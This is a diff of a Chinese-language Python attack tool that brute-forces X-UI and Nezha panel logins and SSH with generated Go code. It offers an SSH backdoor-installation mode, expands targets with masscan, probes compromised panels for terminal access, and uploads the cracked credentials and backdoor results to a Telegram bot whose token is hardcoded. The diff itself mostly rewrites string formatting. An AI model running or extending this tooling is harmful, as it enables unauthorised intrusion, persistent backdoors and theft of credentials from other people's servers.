@@ -10,15 +10,8 @@ import json
 from threading import Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ==================== 最终修复 ====================
-# 强制要求使用 Python 3 运行，防止版本不匹配导致 'ModuleNotFoundError'
-if sys.version_info[0] < 3:
-    print("错误：此脚本需要 Python 3 运行。")
-    print("请使用 'python3 xui.py' 命令来执行。")
-    sys.exit(1)
-# ================================================
-
-# 依赖将在check_environment()中安装，这里仅做导入
+# ==================== 依赖导入强化 ====================
+# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
 try:
     import psutil
     import requests
@@ -27,14 +20,18 @@ try:
     from tqdm import tqdm
     from colorama import Fore, Style, init
     init(autoreset=True)
-except ImportError:
-    # 留空，让环境检查函数处理依赖安装
-    pass
+except ImportError as e:
+    print("错误：核心 Python 模块缺失！")
+    print("缺失的模块是: {}".format(e.name))
+    print("请先手动安装所有依赖：")
+    print("pip install psutil requests pyyaml openpyxl tqdm colorama")
+    sys.exit(1)
 
 try:
     import readline
 except ImportError:
     pass
+# =================================================
 
 # ==================== 新增全局变量 ====================
 TIMEOUT = 5
@@ -1000,7 +997,7 @@ def process_ip_port_file(input_file, output_excel):
         try:
             os.remove(output_excel)
         except OSError as e:
-            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
+            print("无法删除旧的Excel文件 '{}': {}。请手动关闭它。".format(output_excel, e))
             return
 
     wb = Workbook()
@@ -1020,7 +1017,7 @@ def process_ip_port_file(input_file, output_excel):
                 # protocol = proxy_match.group(1) # http:// or https://
                 user = proxy_match.group(2) or ''
                 passwd = proxy_match.group(3) or ''
-                addr = f"{proxy_match.group(1)}{proxy_match.group(4)}" # 重新组合地址部分
+                addr = "{}{}".format(proxy_match.group(1), proxy_match.group(4)) # 重新组合地址部分
             else:
                 # 如果没有协议头，使用空格分割
                 parts = line.split()
@@ -1092,16 +1089,16 @@ def debug_log(message, level="INFO"):
         "ERROR": "\033[91m",
         "ENDC": "\033[0m"
     }
-    print(f"{colors.get(level, '')}[{level}] {message}{colors['ENDC']}")
+    print("[{}] {}{}{}".format(level, colors.get(level, ''), message, colors['ENDC']))
 
 def check_server_terminal_status(session, base_url, server_id):
     # 检测单台服务器的终端连接状态
     try:
         terminal_paths = [
-            f"/dashboard/terminal/{server_id}", f"/dashboard/ssh/{server_id}",
-            f"/dashboard/console/{server_id}", f"/dashboard/shell/{server_id}",
-            f"/terminal/{server_id}", f"/ssh/{server_id}",
-            f"/console/{server_id}", f"/shell/{server_id}"
+            "/dashboard/terminal/{}".format(server_id), "/dashboard/ssh/{}".format(server_id),
+            "/dashboard/console/{}".format(server_id), "/dashboard/shell/{}".format(server_id),
+            "/terminal/{}".format(server_id), "/ssh/{}".format(server_id),
+            "/console/{}".format(server_id), "/shell/{}".format(server_id)
         ]
         for path in terminal_paths:
             try:
@@ -1155,7 +1152,7 @@ def count_terminal_accessible_servers(session, base_url):
         for server in servers:
             if isinstance(server, dict) and "id" in server:
                 server_id = server["id"]
-                server_name = server.get("name", f"Server-{server_id}")
+                server_name = server.get("name", "Server-{}".format(server_id))
                 if check_server_terminal_status(session, base_url, server_id):
                     count += 1
                     accessible_servers.append({"id": server_id, "name": server_name, "status": "终端畅通"})
@@ -1205,7 +1202,7 @@ def analyze_panel(result_line):
     ip_port, username, password = parts[0], parts[1], parts[2]
     
     for protocol in ["http", "https"]:
-        base_url = f"{protocol}://{ip_port}"
+        base_url = "{}://{}".format(protocol, ip_port)
         session = requests.Session()
         login_url = base_url + "/api/v1/login"
         payload = {"username": username, "password": password}
@@ -1230,7 +1227,7 @@ def analyze_panel(result_line):
 
                     if is_login_success:
                         if auth_token:
-                            session.headers.update({"Authorization": f"Bearer {auth_token}"})
+                            session.headers.update({"Authorization": "Bearer {}".format(auth_token)})
                         
                         _, term_count, machine_count, term_servers = check_for_agents_and_terminal(session, base_url)
                         
@@ -1243,7 +1240,7 @@ def analyze_panel(result_line):
                         return result_line, (0, 0, "登录页面")
                     return result_line, (0, 0, "分析失败")
                 except Exception as e:
-                    debug_log(f"分析时出错 {base_url}: {e}", "ERROR")
+                    debug_log("分析时出错 {}: {}".format(base_url, e), "ERROR")
                     return result_line, (0, 0, "分析失败")
         except requests.exceptions.RequestException:
             continue
@@ -1257,7 +1254,7 @@ GO_EXEC = "/usr/local/go/bin/go"
 def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
     # 将哪吒面板的分析结果更新到已生成的Excel文件中
     if not os.path.exists(xlsx_file):
-        print(f"⚠️ Excel文件 {xlsx_file} 不存在，跳过更新。")
+        print("⚠️ Excel文件 {} 不存在，跳过更新。".format(xlsx_file))
         return
 
     try:
@@ -1287,23 +1284,23 @@ def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
         wb.save(xlsx_file)
         print("✅ 成功将哪吒面板分析结果写入Excel报告。")
     except Exception as e:
-        print(f"❌ 更新Excel文件时发生错误: {e}")
+        print("❌ 更新Excel文件时发生错误: {}".format(e))
 
 
 def input_with_default(prompt, default):
-    user_input = input(f"{prompt}（默认 {default}）：").strip()
+    user_input = input("{}（默认 {}）：".format(prompt, default)).strip()
     return int(user_input) if user_input.isdigit() else default
 
 def input_filename_with_default(prompt, default):
-    user_input = input(f"{prompt}（默认 {default}）：").strip()
+    user_input = input("{}（默认 {}）：".format(prompt, default)).strip()
     return user_input if user_input else default
 
 def escape_go_string(s: str) -> str:
     return s.replace("\\", "\\\\").replace('"', '\\"')
 
 def generate_go_code(template_lines, semaphore_size, usernames, passwords, timeout, **kwargs):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
+    user_list = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(u)) for u in usernames]) + "}"
+    pass_list = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(p)) for p in passwords]) + "}"
     
     code = "\n".join(template_lines)
     code = code.replace("{semaphore_size}", str(semaphore_size)) \
@@ -1314,13 +1311,13 @@ def generate_go_code(template_lines, semaphore_size, usernames, passwords, timeo
     # For SSH template
     if 'install_backdoor' in kwargs:
         backdoor_flag = "true" if kwargs['install_backdoor'] else "false"
-        cmd_array = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('custom_cmds', [])]) + "}"
+        cmd_array = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(line)) for line in kwargs.get('custom_cmds', [])]) + "}"
         code = code.replace("{enable_backdoor}", backdoor_flag) \
                    .replace("{custom_backdoor_cmds}", cmd_array)
 
     # For Proxy template
     if 'proxy_type' in kwargs:
-        creds_list = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
+        creds_list = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(line)) for line in kwargs.get('credentials', [])]) + "}"
         code = code.replace("{proxy_type}", kwargs['proxy_type']) \
                    .replace("{auth_mode}", str(kwargs.get('auth_mode', 0))) \
                    .replace("{creds_list}", creds_list)
@@ -1360,11 +1357,11 @@ def compile_go_program():
         if stderr:
             print("--- Go编译器警告 ---")
             print(stderr)
-        print(f"--- Go程序编译成功: {executable_name} ---")
+        print("--- Go程序编译成功: {} ---".format(executable_name))
         return executable_name
     except subprocess.CalledProcessError as e:
         print("--- Go 程序编译失败 ---")
-        print(f"返回码: {e.returncode}")
+        print("返回码: {}".format(e.returncode))
         print("--- 标准输出 ---")
         print(e.stdout)
         print("--- 错误输出 ---")
@@ -1379,7 +1376,7 @@ def adjust_oom_score():
     
     try:
         pid = os.getpid()
-        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
+        oom_score_adj_path = "/proc/{}/oom_score_adj".format(pid)
         if os.path.exists(oom_score_adj_path):
             with open(oom_score_adj_path, "w") as f:
                 f.write("-500")
@@ -1387,7 +1384,7 @@ def adjust_oom_score():
     except PermissionError:
         print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
     except Exception as e:
-        print(f"⚠️  调整OOM Score时发生未知错误: {e}")
+        print("⚠️  调整OOM Score时发生未知错误: {}".format(e))
 
 def check_and_manage_swap():
     if sys.platform != "linux":
@@ -1396,7 +1393,7 @@ def check_and_manage_swap():
     try:
         swap_info = psutil.swap_memory()
         if swap_info.total > 0:
-            print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
+            print("✅ 检测到已存在的Swap空间，大小: {:.2f} MiB。".format(swap_info.total / 1024 / 1024))
             return
 
         print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
@@ -1404,12 +1401,12 @@ def check_and_manage_swap():
         
         if choice == 'y':
             swap_file = "/tmp/autoswap.img"
-            print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
+            print("--- 正在创建2GB Swap文件: {} (可能需要一些时间)... ---".format(swap_file))
             
             if shutil.which("fallocate"):
                 subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
             else:
-                subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(["dd", "if=/dev/zero", "of={}".format(swap_file), "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             subprocess.run(["chmod", "600", swap_file], check=True)
             subprocess.run(["mkswap", swap_file], check=True)
@@ -1417,29 +1414,29 @@ def check_and_manage_swap():
             
             atexit.register(cleanup_swap, swap_file)
             
-            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
+            print("✅ 成功创建并启用了2GB Swap文件: {}".format(swap_file))
             print("   该文件将在脚本退出时自动被禁用和删除。")
 
     except Exception as e:
-        print(f"❌ Swap文件管理失败: {e}")
+        print("❌ Swap文件管理失败: {}".format(e))
         print("   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")
 
 def cleanup_swap(swap_file):
-    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
+    print("\n--- 正在禁用和清理临时Swap文件: {} ---".format(swap_file))
     try:
         subprocess.run(["swapoff", swap_file], check=False)
         os.remove(swap_file)
         print("✅ 临时Swap文件已成功清理。")
     except Exception as e:
-        print(f"⚠️ 清理Swap文件失败: {e}")
+        print("⚠️ 清理Swap文件失败: {}".format(e))
 
 # ==================== 全新执行模型 ====================
 def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
     """
     处理单个IP块的函数，由Python的线程池调用。
     """
-    input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt")
-    output_file = os.path.join(TEMP_XUI_DIR, f"output_{chunk_id}.txt")
+    input_file = os.path.join(TEMP_PART_DIR, "input_{}.txt".format(chunk_id))
+    output_file = os.path.join(TEMP_XUI_DIR, "output_{}.txt".format(chunk_id))
 
     with open(input_file, 'w', encoding='utf-8') as f:
         f.write("\n".join(lines))
@@ -1449,7 +1446,7 @@ def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
         run_env = os.environ.copy()
         total_memory = psutil.virtual_memory().total
         mem_limit = int(total_memory * 0.70 / 1024 / 1024) # 70% of total RAM in MiB
-        run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
+        run_env["GOMEMLIMIT"] = "{}MiB".format(mem_limit)
         run_env["GOGC"] = "50" # 更积极的垃圾回收
 
         cmd = ['./' + executable_name, input_file, output_file]
@@ -1466,10 +1463,10 @@ def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
             if result.returncode == -9 or result.returncode == 137:
                  # OOM Killer
                  # 返回一个特殊错误，让主线程知道发生了什么
-                 return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
+                 return (False, "任务 {} 被系统因内存不足而终止(OOM Killed)。".format(chunk_id))
             else:
                  # 其他错误
-                 return (False, f"任务 {chunk_id} 失败，返回码 {result.returncode}。\n错误信息:\n{stderr_str}")
+                 return (False, "任务 {} 失败，返回码 {}。\n错误信息:\n{}".format(chunk_id, result.returncode, stderr_str))
         
         return (True, None) # 成功
     finally:
@@ -1485,7 +1482,7 @@ def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal
     # 将所有IP分成小块
     chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
     
-    print(f"--- 已将 {len(lines)} 个目标分为 {len(chunks)} 个小任务块 ---")
+    print("--- 已将 {} 个目标分为 {} 个小任务块 ---".format(len(lines), len(chunks)))
     
     with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
         # 提交所有任务
@@ -1498,14 +1495,14 @@ def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal
                 try:
                     success, error_message = future.result()
                     if not success:
-                        print(f"\n❌ {error_message}")
+                        print("\n❌ {}".format(error_message))
                         # 如果发生OOM，最好停止所有任务
                         if "OOM" in error_message:
                             print("检测到OOM错误，正在中止所有任务...")
                             executor.shutdown(wait=False, cancel_futures=True)
                             raise SystemExit("内存不足，脚本已中止。请使用更低的并发数重试。")
                 except Exception as exc:
-                    print(f'\n任务 {chunk_id} 执行时产生异常: {exc}')
+                    print('\n任务 {} 执行时产生异常: {}'.format(chunk_id, exc))
                 
                 pbar.update(1)
 
@@ -1599,7 +1596,7 @@ def check_environment(template_mode):
         except subprocess.CalledProcessError as e:
             if check: raise e
         except FileNotFoundError:
-            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。")
+            print("❌ 命令未找到: {}。请确保该命令在您的系统PATH中。".format(cmd[0]))
             raise
 
     def is_in_china():
@@ -1643,12 +1640,12 @@ def check_environment(template_mode):
         print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。")
         sys.exit(1)
 
-    print(f"    - 检测到包管理器: {pkg_manager}")
+    print("    - 检测到包管理器: {}".format(pkg_manager))
     
     UPDATED = False
     def ensure_packages(pm, packages):
         nonlocal UPDATED
-        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包...")
+        sys.stdout.write("    - 正在使用 {} 检查系统包...".format(pm))
         sys.stdout.flush()
         try:
             if not UPDATED and pm == "apt-get":
@@ -1659,7 +1656,7 @@ def check_environment(template_mode):
             run_cmd(install_cmd, quiet=True)
             print(" 完成")
         except Exception as e:
-            print(f" 失败: {e}")
+            print(" 失败: {}".format(e))
             sys.exit(1)
 
     ping_package = "iputils" if pkg_manager == "yum" else "iputils-ping"
@@ -1684,7 +1681,7 @@ def check_environment(template_mode):
         run_cmd(pip_cmd, quiet=True)
         print(" 完成")
     except Exception as e:
-        print(f" 失败: {e}")
+        print(" 失败: {}".format(e))
         sys.exit(1)
 
     ensure_packages(pkg_manager, ["ca-certificates", "tar", "masscan"])
@@ -1719,13 +1716,13 @@ def check_environment(template_mode):
         GO_TAR_PATH = "/tmp/go.tar.gz"
         download_success = False
         for url in urls:
-            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
+            print("    - 正在从 {} 下载Go...".format(url.split('/')[2]))
             try:
                 subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                 download_success = True
                 break
             except Exception:
-                print(f"      下载失败，尝试下一个源...")
+                print("      下载失败，尝试下一个源...")
         
         if not download_success:
             print("❌ Go安装包下载失败，请检查网络。")
@@ -1738,7 +1735,7 @@ def check_environment(template_mode):
             run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
             print(" 完成")
         except Exception as e:
-            print(f" 失败: {e}")
+            print(" 失败: {}".format(e))
             sys.exit(1)
 
         os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
@@ -1765,7 +1762,7 @@ def check_environment(template_mode):
             try:
                 run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
             except subprocess.CalledProcessError as e:
-                print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。")
+                print("\n❌ Go模块 '{}' 安装失败。请检查网络或代理设置。".format(pkg))
                 raise e 
         print(" 完成")
 
@@ -1826,7 +1823,7 @@ def get_vps_info():
         data = response.json()
         return data.get('query', 'N/A'), data.get('country', 'N/A')
     except requests.exceptions.RequestException as e:
-        print(f"⚠️ 获取VPS信息失败: {e}")
+        print("⚠️ 获取VPS信息失败: {}".format(e))
     return "N/A", "N/A"
 
 def get_nezha_server(config_file="config.yml"):
@@ -1839,7 +1836,7 @@ def get_nezha_server(config_file="config.yml"):
             if isinstance(config_data, dict) and 'server' in config_data:
                 return config_data['server']
     except Exception as e:
-        print(f"⚠️ 解析 {config_file} 失败: {e}")
+        print("⚠️ 解析 {} 失败: {}".format(config_file, e))
     return "N/A"
 
 def parse_result_line(line):
@@ -1875,7 +1872,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
     all_newly_verified_ips = set()
 
     for i in range(2): # 执行两轮扩展
-        print(f"\n--- [扩展扫描 第 {i+1}/2 轮] ---")
+        print("\n--- [扩展扫描 第 {}/2 轮] ---".format(i + 1))
         
         groups = {}
         for line in ips_to_analyze:
@@ -1891,20 +1888,20 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
         expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
 
         if not expandable_targets:
-            print(f"  - 第 {i+1} 轮未找到符合条件的IP集群，扩展扫描结束。")
+            print("  - 第 {} 轮未找到符合条件的IP集群，扩展扫描结束。".format(i + 1))
             break
 
-        print(f"  - 第 {i+1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
+        print("  - 第 {} 轮发现 {} 个可扩展的IP集群。".format(i + 1, len(expandable_targets)))
         
         newly_verified_this_round = set()
         masscan_output_file = "masscan_results.tmp"
 
         for j, (subnet, port, user, password) in enumerate(expandable_targets):
-            print(f"\n  --- [扫描集群 {j+1}/{len(expandable_targets)}] 目标: {subnet} 端口: {port} ---")
+            print("\n  --- [扫描集群 {}/{}] 目标: {} 端口: {} ---".format(j + 1, len(expandable_targets), subnet, port))
             
             masscan_ips_for_this_cluster = set()
             for k in range(2):
-                print(f"    - Masscan 第 {k+1}/2 轮...")
+                print("    - Masscan 第 {}/2 轮...".format(k + 1))
                 try:
                     if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
                     masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
@@ -1915,19 +1912,19 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                             if line.startswith("Host:"):
                                 masscan_ips_for_this_cluster.add(line.split()[1])
                 except subprocess.TimeoutExpired:
-                    print(f"      - ⚠️ Masscan 扫描超时（超过120秒），可能系统负载过高。")
+                    print("      - ⚠️ Masscan 扫描超时（超过120秒），可能系统负载过高。")
                 except (subprocess.CalledProcessError, FileNotFoundError) as e:
-                    print(f"      - ❌ Masscan 扫描失败: {e}")
+                    print("      - ❌ Masscan 扫描失败: {}".format(e))
             
             ips_to_verify = masscan_ips_for_this_cluster - master_results
-            print(f"    - Masscan 两轮共发现 {len(masscan_ips_for_this_cluster)} 个存活主机，其中 {len(ips_to_verify)} 个是新目标。")
+            print("    - Masscan 两轮共发现 {} 个存活主机，其中 {} 个是新目标。".format(len(masscan_ips_for_this_cluster), len(ips_to_verify)))
             if not ips_to_verify:
                 continue
 
             verification_input_file = "verification_input.tmp"
             with open(verification_input_file, 'w') as f:
-                for ip in ips_to_verify:
-                    f.write(f"{ip}:{port}\n")
+                for ip_addr in ips_to_verify:
+                    f.write("{}:{}\n".format(ip_addr, port))
             
             print("    - 正在对新发现的IP进行二次验证...")
             
@@ -1944,7 +1941,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                 run_env = os.environ.copy()
                 total_memory = psutil.virtual_memory().total
                 mem_limit = int(total_memory * 0.70 / 1024 / 1024)
-                run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
+                run_env["GOMEMLIMIT"] = "{}MiB".format(mem_limit)
                 run_env["GOGC"] = "50"
                 
                 verification_output_file = "verification_output.tmp"
@@ -1966,17 +1963,17 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
                 if os.path.exists(verification_output_file):
                     with open(verification_output_file, 'r') as f:
                         new_finds = {line.strip() for line in f}
-                        print(f"    - 二次验证成功 {len(new_finds)} 个新目标。")
+                        print("    - 二次验证成功 {} 个新目标。".format(len(new_finds)))
                         newly_verified_this_round.update(new_finds)
                     os.remove(verification_output_file)
             except Exception as e:
-                print(f"    - ❌ 二次验证失败: {e}")
+                print("    - ❌ 二次验证失败: {}".format(e))
             
             if os.path.exists(verification_input_file): os.remove(verification_input_file)
         
         new_ips_this_round = newly_verified_this_round - master_results
         if not new_ips_this_round:
-            print(f"--- 第 {i+1} 轮未发现任何全新的IP，扩展扫描结束。 ---")
+            print("--- 第 {} 轮未发现任何全新的IP，扩展扫描结束。 ---".format(i + 1))
             break
         
         master_results.update(new_ips_this_round)
@@ -2018,18 +2015,18 @@ if __name__ == "__main__":
         print("\n=== 爆破一键启动 - 参数配置 ===")
         input_file = input_filename_with_default("请输入源文件名", "1.txt")
         if not os.path.exists(input_file):
-                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
+                print("❌ 错误: 文件 '{}' 不存在。".format(input_file))
                 sys.exit(1)
 
         with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
             all_lines = [line.strip() for line in f if line.strip()]
             total_ips = len(all_lines)
-        print(f"--- 总计 {total_ips} 个目标 ---")
+        print("--- 总计 {} 个目标 ---".format(total_ips))
         
         # ==================== 优化：动态并发建议 ====================
         total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
         if total_memory_mb < 1500: # 如果内存小于 1.5GB
-            print(f"⚠️ 检测到系统内存较低 ({total_memory_mb:.2f} MiB)，建议使用保守的并发数。")
+            print("⚠️ 检测到系统内存较低 ({:.2f} MiB)，建议使用保守的并发数。".format(total_memory_mb))
             recommended_py_concurrency = 5
             recommended_go_concurrency = 20
         else:
@@ -2041,8 +2038,8 @@ if __name__ == "__main__":
         print("脚本将启动多个并行的扫描进程（由Python控制），每个进程内部再使用多个线程（由Go控制）进行扫描。")
         print("对于内存较小的设备，请保持“Python并发任务数”为一个较低的数值。")
 
-        python_concurrency = input_with_default(f"请输入Python并发任务数 (推荐 {recommended_py_concurrency})", recommended_py_concurrency)
-        go_internal_concurrency = input_with_default(f"请输入每个任务内部的Go并发数 (推荐 {recommended_go_concurrency})", recommended_go_concurrency)
+        python_concurrency = input_with_default("请输入Python并发任务数 (推荐 {})".format(recommended_py_concurrency), recommended_py_concurrency)
+        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数 (推荐 {})".format(recommended_go_concurrency), recommended_go_concurrency)
         chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)
 
         params = {'semaphore_size': go_internal_concurrency} # Go程序现在使用这个参数
@@ -2125,7 +2122,7 @@ if __name__ == "__main__":
         if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
             newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
             if newly_found_results:
-                print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
+                print("--- 扩展扫描完成，共新增 {} 个结果。正在合并... ---".format(len(newly_found_results)))
                 with open(initial_results_file, 'a', encoding='utf-8') as f:
                     for result in sorted(list(newly_found_results)):
                         f.write(result + '\n')
@@ -2136,8 +2133,8 @@ if __name__ == "__main__":
                     f.writelines(unique_lines)
                 print("--- 结果合并去重完成。 ---")
         
-        final_txt_file = f"{prefix}-{time_str}.txt"
-        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+        final_txt_file = "{}-{}.txt".format(prefix, time_str)
+        final_xlsx_file = "{}-{}.xlsx".format(prefix, time_str)
         
         if os.path.exists("xui.txt"):
             os.rename("xui.txt", final_txt_file)
@@ -2145,7 +2142,7 @@ if __name__ == "__main__":
 
         if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
             analysis_threads = nezha_analysis_threads
-            print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {analysis_threads} 线程）... ---")
+            print("\n--- 开始对成功的哪吒面板进行深度分析（使用 {} 线程）... ---".format(analysis_threads))
             with open(final_txt_file, 'r', encoding='utf-8') as f:
                 results = [line.strip() for line in f if line.strip()]
             
@@ -2163,7 +2160,7 @@ if __name__ == "__main__":
                         else:
                              nezha_analysis_data[returned_line] = ("数据不一致", 0, "N/A")
                     except Exception as exc:
-                        print(f'{result_line} 生成了一个异常: {exc}')
+                        print('{} 生成了一个异常: {}'.format(result_line, exc))
                         nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
 
             if nezha_analysis_data:
@@ -2173,15 +2170,15 @@ if __name__ == "__main__":
             merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
             merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
             if os.path.exists("hmsuccess.txt"):
-                os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
+                os.rename("hmsuccess.txt", "后门成功-{}.txt".format(time_str))
             if os.path.exists("hmfail.txt"):
-                os.rename("hmfail.txt", f"后门失败-{time_str}.txt")
+                os.rename("hmfail.txt", "后门失败-{}.txt".format(time_str))
 
     except KeyboardInterrupt:
             print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
             interrupted = True
     except SystemExit as e:
-            print(f"\n脚本因严重错误中止: {e}")
+            print("\n脚本因严重错误中止: {}".format(e))
             interrupted = True # Treat as interruption for cleanup
     except EOFError:
             print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
@@ -2194,26 +2191,26 @@ if __name__ == "__main__":
             vps_ip, vps_country = get_vps_info()
             nezha_server = get_nezha_server()
             
-            run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
+            run_time_str = "{} 分 {} 秒".format(cost // 60, cost % 60)
             if interrupted:
-                    print(f"\n=== 脚本已被中断，中止前共运行 {run_time_str} ===")
+                    print("\n=== 脚本已被中断，中止前共运行 {} ===".format(run_time_str))
             else:
-                    print(f"\n=== 全部完成！总用时 {run_time_str} ===")
+                    print("\n=== 全部完成！总用时 {} ===".format(run_time_str))
 
             def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
                     if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
-                            print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
+                            print("⚠️ Telegram 上传跳过：文件 {} 不存在或为空".format(file_path))
                             return
 
-                    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                    url = "https://api.telegram.org/bot{}/sendDocument".format(bot_token)
                     caption_text = (
-                        f"VPS: {vps_ip} ({vps_country})\n"
-                        f"总目标数: {total_ips}\n"
-                        f"总用时: {run_time_str}\n"
-                    )
+                        "VPS: {} ({})\n"
+                        "总目标数: {}\n"
+                        "总用时: {}\n"
+                    ).format(vps_ip, vps_country, total_ips, run_time_str)
                     if nezha_server != "N/A":
-                        caption_text += f"哪吒Server: {nezha_server}\n"
-                    caption_text += f"任务结果: {os.path.basename(file_path)}"
+                        caption_text += "哪吒Server: {}\n".format(nezha_server)
+                    caption_text += "任务结果: {}".format(os.path.basename(file_path))
                     
                     with open(file_path, "rb") as f:
                             files = {'document': f}
@@ -2221,29 +2218,29 @@ if __name__ == "__main__":
                             try:
                                     response = requests.post(url, data=data, files=files, timeout=60)
                                     if response.status_code == 200:
-                                            print(f"✅ 文件 {file_path} 已发送到 Telegram")
+                                            print("✅ 文件 {} 已发送到 Telegram".format(file_path))
                                     else:
-                                            print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
+                                            print("❌ TG上传失败，状态码：{}，返回：{}".format(response.status_code, response.text))
                             except Exception as e:
-                                    print(f"❌ 发送到 TG 失败：{e}")
+                                    print("❌ 发送到 TG 失败：{}".format(e))
 
             BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
             CHAT_ID = "7697235358"
 
             if BOT_TOKEN and CHAT_ID:
                 files_to_send = []
-                final_txt_file = f"{prefix}-{time_str}.txt"
-                final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+                final_txt_file = "{}-{}.txt".format(prefix, time_str)
+                final_xlsx_file = "{}-{}.xlsx".format(prefix, time_str)
 
                 if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
                 if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                 
                 if TEMPLATE_MODE == 6:
-                    success_file = f"后门成功-{time_str}.txt"
-                    fail_file    = f"后门失败-{time_str}.txt"
+                    success_file = "后门成功-{}.txt".format(time_str)
+                    fail_file    = "后门失败-{}.txt".format(time_str)
                     if os.path.exists(success_file): files_to_send.append(success_file)
                     if os.path.exists(fail_file): files_to_send.append(fail_file)
 
                 for f in files_to_send:
-                    print(f"\n📤 正在将 {f} 上传至 Telegram ...")
+                    print("\n📤 正在将 {} 上传至 Telegram ...".format(f))
                     send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
